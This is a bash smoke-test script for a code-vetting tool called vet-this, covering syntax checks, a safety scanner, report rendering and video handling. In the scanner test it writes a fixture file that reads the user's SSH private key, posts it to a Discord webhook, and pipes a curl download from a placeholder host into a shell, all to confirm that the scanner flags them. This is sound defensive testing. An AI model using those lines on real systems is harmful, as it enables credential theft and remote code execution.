#!/usr/bin/env bash
# Smoke tests for vet-this. Offline: no network calls, nothing installed, nothing from a fixture
# is executed. The video check runs only when ffmpeg is installed.
#
# Usage: bash tests/smoke.sh        (KEEP=1 keeps the temp work folder)
# Exits 0 when every check passes, 1 otherwise.
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
S="$ROOT/scripts"
PY="$(command -v "${PYTHON:-python3}")"
T="$(mktemp -d "${TMPDIR:-/tmp}/vet-this-smoke.XXXXXX")"
[[ "${KEEP:-0}" == 1 ]] && echo "work dir: $T" || trap 'rm -rf "$T"' EXIT

PASS=0 FAIL=0
ok()   { PASS=$((PASS+1)); printf '  ok    %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  FAIL  %s\n' "$1"; [[ -n "${2:-}" ]] && printf '        %s\n' "$2"; }
check() { local name="$1"; shift; local out; if out="$("$@" 2>&1)"; then ok "$name"; else bad "$name" "$(tail -3 <<<"$out")"; fi; }
has()  { grep -q -- "$2" "$1"; }

echo "vet-this smoke tests"

# --- 1. syntax -------------------------------------------------------------------------------
echo "syntax"
check "preflight.sh parses" bash -n "$S/preflight.sh"
for f in safety_scan fetch_media repo_stats md_to_html; do
  check "$f.py compiles" "$PY" -c "import ast,sys;ast.parse(open(sys.argv[1]).read())" "$S/$f.py"
done

# --- 2. preflight ----------------------------------------------------------------------------
echo "preflight.sh"
check "core tools found (git, python3, curl)" bash "$S/preflight.sh"

# --- 3. safety scanner -----------------------------------------------------------------------
# The planted strings are split so this test file does not itself look like malware to scanners.
echo "safety_scan.py"
mkdir -p "$T/bad" "$T/clean"
W="web""hooks"; SH="s""h"
cat > "$T/bad/helper.py" <<EOF
import os, requests
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://discord.com/api/$W/1/x", data=key)
os.system("curl -s http://example.invalid/a.sh | $SH")
EOF
printf 'def add(a, b):\n    return a + b\n\nprint(add(2, 3))\n' > "$T/clean/app.py"

"$PY" -I "$S/safety_scan.py" "$T/bad" --out "$T/bad.md" >/dev/null 2>&1
check "malicious fixture: scan writes a report" test -s "$T/bad.md"
if grep -Eq "Findings: [3-9][0-9]* high|Findings: [1-9][0-9]+ high" "$T/bad.md"; then ok "  3+ high findings"; else bad "  3+ high findings" "$(grep Findings "$T/bad.md")"; fi
check "  flags SSH key access" has "$T/bad.md" "touches SSH keys"
check "  flags webhook upload" has "$T/bad.md" "webhook or paste service"
check "  flags curl into shell" has "$T/bad.md" "pipes a download straight into a shell"
check "  flags the stealer combination" has "$T/bad.md" "Risky combinations"
"$PY" -I "$S/safety_scan.py" "$T/clean" --out "$T/clean.md" >/dev/null 2>&1
check "clean fixture: 0 high findings" has "$T/clean.md" "Findings: 0 high"

# --- 4. report rendering ---------------------------------------------------------------------
echo "md_to_html.py"
cat > "$T/report.md" <<'EOF'
# vet-this: sample

## Verdict

> **Safety:** safe with caveats

| Part | Result |
|---|---|
| Hype | holds |

- one `code` item and a [link](https://example.com)
EOF
check "renders report.html" "$PY" "$S/md_to_html.py" "$T/report.md" "$T/report.html"
check "  has the table" has "$T/report.html" "<table"
check "  has the link" has "$T/report.html" 'href="https://example.com"'

# --- 5. local video --------------------------------------------------------------------------
echo "fetch_media.py (local file)"
if command -v ffmpeg >/dev/null && command -v ffprobe >/dev/null; then
  # Only ffmpeg on PATH, so no whisper model is downloaded or run.
  mkdir -p "$T/bin"; ln -s "$(command -v ffmpeg)" "$T/bin/ffmpeg"; ln -s "$(command -v ffprobe)" "$T/bin/ffprobe"
  ffmpeg -loglevel error -f lavfi -i testsrc=duration=3:size=320x240:rate=10 "$T/clip.mp4"
  check "reads a local video" env PATH="$T/bin:/usr/bin:/bin" "$PY" "$S/fetch_media.py" "$T/clip.mp4" --out "$T/media" --max-frames 4
  check "  summary has frames" "$PY" -c "import json,sys;s=json.load(open(sys.argv[1]));sys.exit(0 if s.get('frames') else 'no frames')" "$T/media/summary.json"
else
  echo "  skip  ffmpeg not installed"
fi

echo
echo "$PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
